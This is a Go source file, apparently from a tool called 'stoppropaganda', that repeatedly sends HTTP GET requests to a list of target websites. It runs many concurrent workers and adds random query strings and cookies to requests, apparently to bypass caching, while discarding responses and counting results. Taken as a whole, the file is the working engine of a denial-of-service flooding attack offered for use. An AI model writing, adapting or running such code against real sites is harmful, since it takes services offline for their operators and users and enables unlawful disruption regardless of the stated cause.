package stoppropaganda

import (
	"crypto/rand"
	"fmt"
	"log"
	mrand "math/rand"
	"net"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/erkexzcx/stoppropaganda/internal/customresolver"
	"github.com/erkexzcx/stoppropaganda/internal/resolvefix"
	"github.com/erkexzcx/stoppropaganda/internal/targets"
	"github.com/valyala/fasthttp"
)

const VALIDATE_DNS_EVERY = 5 * time.Minute

type WebsiteStatus struct {
	Requests     uint   `json:"requests"`
	Errors       uint   `json:"errors"`
	Downloaded   uint64 `json:"downloaded"`
	LastErrorMsg string `json:"last_error_msg"`
	Status       string `json:"status"`

	Counter_code100 uint `json:"status_100"`
	Counter_code200 uint `json:"status_200"`
	Counter_code300 uint `json:"status_300"`
	Counter_code400 uint `json:"status_400"`
	Counter_code500 uint `json:"status_500"`
}

func (ws *WebsiteStatus) IncreaseCounters(downloaded int, responseCode int) {
	ws.Requests++
	ws.Downloaded += uint64(downloaded)
	switch {
	case responseCode < 200:
		ws.Counter_code100++
	case responseCode < 300:
		ws.Counter_code200++
	case responseCode < 400:
		ws.Counter_code300++
	case responseCode < 500:
		ws.Counter_code400++
	default:
		ws.Counter_code500++
	}
}

func (ws *Website) IncreaseCountersErr(errMsg string) {
	ws.statusMux.Lock()
	ws.status.IncreaseCountersErr(errMsg)
	ws.statusMux.Unlock()

	if strings.HasSuffix(errMsg, "Non public IP detected") {
		ws.setPaused(30*time.Second, errMsg)
	}
	if strings.HasSuffix(errMsg, "couldn't find DNS entries for the given domain. Try using DialDualStack") {
		ws.setPaused(30*time.Second, errMsg)
	}
}

func (ws *WebsiteStatus) IncreaseCountersErr(errMsg string) {
	ws.Requests++
	ws.Errors++
	ws.LastErrorMsg = errMsg

}

func RandomNumberLetterString () string {
	n := mrand.Intn(30 - 1) + 1
	b := make([]byte, n)
	if _, err := rand.Read(b); err != nil {
		panic(err)
	}
	s := fmt.Sprintf("%x", b)
	return s
}

type Website struct {
	// These do not need synchronization as these are read-only
	host string
	req  *fasthttp.Request

	// Store status (counters) about website
	statusMux sync.Mutex
	status    WebsiteStatus

	// Used to handle logic that defines whether website is paused or not.
	checksPauseMux sync.Mutex
	dnsLastChecked time.Time
	pausedUntil    time.Time
	pausedC        chan struct{}

	// optimizations
	helperIPBuf []net.IP
}

var httpClient *fasthttp.Client

var websites = map[string]*Website{}

func NewWebsite(websiteUrlStr string) (website *Website) {
	websiteURL, err := url.Parse(websiteUrlStr)
	if err != nil {
		panic(err)
	}

	newReq := fasthttp.AcquireRequest()
	newReq.SetRequestURI(websiteUrlStr)
	newReq.Header.SetMethod(fasthttp.MethodGet)
	newReq.Header.Set("Host", websiteURL.Host)
	newReq.Header.Set("User-Agent", *flagUserAgent)
	newReq.Header.Set("Accept", "*/*")

	website = &Website{
		host: websiteURL.Host,
		status: WebsiteStatus{
			Status: "Initializing",
		},
		dnsLastChecked: time.Now().Add(-VALIDATE_DNS_EVERY), // this forces validation on first run
		pausedUntil:    time.Now(),
		req:            newReq,
		helperIPBuf:    make([]net.IP, 128),
	}
	return
}

func startWebsites() {
	for websiteUrl := range targets.TargetWebsites {
		websites[websiteUrl] = NewWebsite(websiteUrl)
	}

	switch *flagAlgorithm {
	case "rr":
		log.Println("Selected algorithm:", *flagAlgorithm)
		startWebsitesRoundRobin()
	case "fair":
		log.Println("Selected algorithm:", *flagAlgorithm)
		startWebsitesParallel()
	default:
		log.Fatalln("unknown algorithm:", *flagAlgorithm)
	}
}

func startWebsitesRoundRobin() {
	websitesChannel := make(chan *Website, *flagWorkers)
	log.Printf("Spawning %d workers", *flagWorkers)

	// Spawn workers
	for i := 0; i < *flagWorkers; i++ {
		go runRoundRobinWorker(websitesChannel)
	}

	// Issue tasks
	go func() {
		for {
			// Round robin algorithm
			for _, website := range websites {
				websitesChannel <- website
			}
		}
	}()
}

func startWebsitesParallel() {
	websitesArr := make([]*Website, 0, len(websites))
	for _, website := range websites {
		websitesArr = append(websitesArr, website)
	}
	// Spawn few workers for each website
	numWorkers := *flagWorkers
	perWebsite := float64(numWorkers) / float64(len(websitesArr))
	log.Printf("Spawning %d workers for %d websites = %.1f workers/website", numWorkers, len(websitesArr), perWebsite)
	for i := 0; i < numWorkers; i++ {
		idx := i % len(websitesArr)
		website := websitesArr[idx]
		go runPerWebsiteWorker(website)
	}
	if perWebsite < 1.0 {
		log.Printf("Warn: Some websites have 0 workers, websites choosen randomly")
	}
}

// checksPauseMux must be locked prior calling this func
func (ws *Website) setPaused(duration time.Duration, reason string) {
	ws.statusMux.Lock()
	ws.status.Status = "Paused: " + reason
	ws.statusMux.Unlock()
	ws.pausedUntil = time.Now().Add(duration)
	pausedC := make(chan struct{})
	ws.pausedC = pausedC
	go func() {
		<-time.After(duration)
		close(pausedC)
	}()
}

func (ws *Website) allowedToRun() bool {
	ws.checksPauseMux.Lock()
	defer ws.checksPauseMux.Unlock()

	// Do not run if paused
	if time.Now().Before(ws.pausedUntil) {
		return false
	}

	needsValidation := time.Since(ws.dnsLastChecked) >= VALIDATE_DNS_EVERY

	// If validation is not (yet) needed - run
	if !needsValidation {
		return true
	}

	// Validation is needed...
	ws.dnsLastChecked = time.Now()
	ipAddresses, err := customresolver.GetIPs(ws.host, ws.helperIPBuf)
	if err != nil {
		errStr := err.Error()
		switch {
		case strings.HasSuffix(errStr, "Temporary failure in name resolution") || strings.HasSuffix(errStr, "connection refused"):
			ws.setPaused(time.Second, "Your DNS servers unreachable or returned an error: "+errStr)
			return false
		case strings.HasSuffix(errStr, "no such host"):
			ws.setPaused(5*time.Minute, "Domain does not exist: "+errStr)
			return false
		case strings.HasSuffix(errStr, "No address associated with hostname"):
			ws.setPaused(5*time.Minute, "Domain does not have any IPs assigned: "+errStr)
			return false
		}
		ws.setPaused(10*time.Second, errStr)
		return false
	}

	if err = resolvefix.CheckNonPublicIP(ipAddresses); err != nil {
		ws.setPaused(5*time.Minute, err.Error())
		return false
	}
	return true
}

func runPerWebsiteWorker(website *Website) {
	// Each worker has it's own response
	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	withTimeout := false

	// Copy once
	website.req.CopyTo(req) // https://github.com/valyala/fasthttp/issues/53#issuecomment-185125823

	for {
		if !website.allowedToRun() {
			// Wait for unpause
			<-website.pausedC
			continue
		}
		doSingleRequest(website, req, resp, withTimeout)
	}
}

func runRoundRobinWorker(websitesC chan *Website) {
	// Each worker has it's own response
	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	withTimeout := true

	for {
		website := <-websitesC
		if !website.allowedToRun() {
			// Instantly skip to another website
			continue
		}
		// Last request could've been for another website
		// so we have to copy
		website.req.CopyTo(req) // https://github.com/valyala/fasthttp/issues/53#issuecomment-185125823

		doSingleRequest(website, req, resp, withTimeout)
	}
}

func doSingleRequest(ws *Website, req *fasthttp.Request, resp *fasthttp.Response, withTimeout bool) {
	ws.statusMux.Lock()
	ws.status.Status = "Running"
	ws.statusMux.Unlock()

	resp.ShouldDiscardBody = true

	if *flagUseQueryParams == 1 {
		// clean up query string and cookies from previous request
		ws.req.URI().SetQueryString("")
		ws.req.Header.DelAllCookies()

		randInt := mrand.Intn(5)

		// exclude query params and cookies some of the time (1 nth of randInt)
		if randInt > 0 {
			for i := 1; i < randInt; i++ {
				log.Printf("adding")
				qsKey := RandomNumberLetterString()
				qsValue := RandomNumberLetterString()
				ws.req.URI().QueryArgs().Add(qsKey, qsValue)

				cookieKey := RandomNumberLetterString()
				cookieValue := RandomNumberLetterString()
				ws.req.Header.SetCookie(cookieKey, cookieValue)
			}
		}
	}

	// Perform request
	var err error
	if withTimeout {
		err = httpClient.DoTimeout(req, resp, *flagTimeout)
	} else {
		err = httpClient.Do(req, resp)
	}
	if err != nil {
		ws.IncreaseCountersErr("httpClient.Do: " + err.Error())
		return
	}

	downloaded := resp.LastDiscarded
	if !resp.ShouldDiscardBody {
		downloaded = len(resp.Body())
	}

	// Prevent site memory leaking us with 32+ MB (uno reverso)
	if len(resp.Body()) > 32*1024*1024 {
		resp.ResetBody()
	}

	// Increase counters
	ws.statusMux.Lock()
	ws.status.IncreaseCounters(downloaded, resp.StatusCode())
	ws.statusMux.Unlock()
}
